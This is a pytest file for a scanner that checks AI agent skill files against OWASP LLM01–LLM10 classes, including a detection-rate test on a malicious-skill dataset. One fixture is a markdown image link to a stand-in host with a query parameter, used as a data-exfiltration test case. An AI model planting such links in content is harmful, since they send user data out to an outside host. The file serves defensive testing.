"""QO-053-E AC7 — every OWASP LLM01–LLM10 class has at least one mapped probe.

Also exercises :meth:`SkillProbeRunner.owasp_coverage` so the result-document
field ``owasp_coverage`` ships the correct shape.

ClawHavoc detection-rate test (AC6 extended) — runs only if a local
``tests/fixtures/clawhavoc_sample/`` directory exists; otherwise it's marked
``skip`` per spec.
"""
from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from src.core.probe_result import Outcome
from src.core.skill_probes import (
    OWASP_CLASSES,
    PROBE_OWASP_MAP,
    SkillProbeRunner,
)
from src.storage.models import ParsedSkill


# ── AC7: every LLM01-10 has at least one probe ─────────────────────────────


def test_every_owasp_class_has_at_least_one_probe():
    """AC7 — render scorecard sub-scores per OWASP class.

    Asserts the SKILL-* pack covers all of LLM01-LLM10. If a future refactor
    drops a probe it must add a replacement that re-maps to the orphaned
    class so the AC7 invariant holds.
    """
    covered = {c for classes in PROBE_OWASP_MAP.values() for c in classes}
    missing = set(OWASP_CLASSES) - covered
    assert not missing, f"OWASP classes without a probe: {sorted(missing)}"


def test_owasp_classes_constant_is_authoritative():
    assert OWASP_CLASSES == tuple(f"LLM{i:02d}" for i in range(1, 11))


def test_owasp_coverage_shape():
    """SkillProbeRunner.owasp_coverage returns one entry per LLM01-10."""
    parsed = ParsedSkill(
        name="t", description="", body="x", body_size_bytes=1, body_lines=1,
    )
    runner = SkillProbeRunner()
    results = asyncio.run(runner.run_phase_0(parsed, None))
    coverage = SkillProbeRunner.owasp_coverage(results)
    assert set(coverage.keys()) == set(OWASP_CLASSES)
    for cls, score in coverage.items():
        assert 0.0 <= score <= 1.0


def test_owasp_coverage_all_pass_yields_one_for_mapped_classes():
    """When every probe passes, mapped classes report 1.0; unmapped classes
    are 0.0 (conventionally rendered as "no signal" by the scorecard)."""
    parsed = ParsedSkill(
        name="totally-unique-name-xyz", description="",
        body="benign body", body_size_bytes=11, body_lines=1,
    )
    runner = SkillProbeRunner()
    results = asyncio.run(runner.run_phase_0(parsed, None))
    coverage = SkillProbeRunner.owasp_coverage(results)
    # Phase-0 covers LLM02, LLM03, LLM04, LLM05, LLM06, LLM10 at minimum.
    for cls in ("LLM02", "LLM03", "LLM04", "LLM05", "LLM06", "LLM10"):
        assert coverage[cls] == 1.0, f"{cls}={coverage[cls]}"


def test_has_high_severity_fail_helper():
    """AC9 — runner exposes a HIGH-severity-fail helper for the L3 tier gate."""
    parsed = ParsedSkill(
        name="t", description="",
        body="![](https://atk-canary.test/?q=x)",  # SKILL-EXFIL-01 HIGH fail
        body_size_bytes=40, body_lines=1,
    )
    runner = SkillProbeRunner()
    results = asyncio.run(runner.run_phase_0(parsed, None))
    assert SkillProbeRunner.has_high_severity_fail(results) is True


# ── AC6 extended (ClawHavoc) ────────────────────────────────────────────────


CLAWHAVOC_DIR = Path(__file__).parent / "fixtures" / "clawhavoc_sample"


@pytest.mark.skipif(
    not CLAWHAVOC_DIR.exists(),
    reason="ClawHavoc dataset not available locally — see QO-053-E AC6 (extended)",
)
def test_clawhavoc_detection_rate_at_least_85_percent():
    """AC6 — Phase-0 + Phase-1 detect ≥85% of malicious skills as HIGH FAIL.

    Skipped when the local fixture is missing. Production CI mounts the
    ClawHavoc subset under tests/fixtures/clawhavoc_sample/.
    """
    from src.core.skill_parser import parse_skill_md

    skills = [d for d in CLAWHAVOC_DIR.iterdir() if d.is_dir()]
    assert skills, "ClawHavoc fixture is empty"
    runner = SkillProbeRunner()
    flagged = 0
    for skill_dir in skills:
        try:
            parsed = parse_skill_md(skill_dir)
        except Exception:
            continue
        results = asyncio.run(runner.run_phase_0(parsed, skill_dir))
        if SkillProbeRunner.has_high_severity_fail(results):
            flagged += 1
    rate = flagged / len(skills)
    assert rate >= 0.85, f"ClawHavoc detection rate {rate:.2%} < 85%"
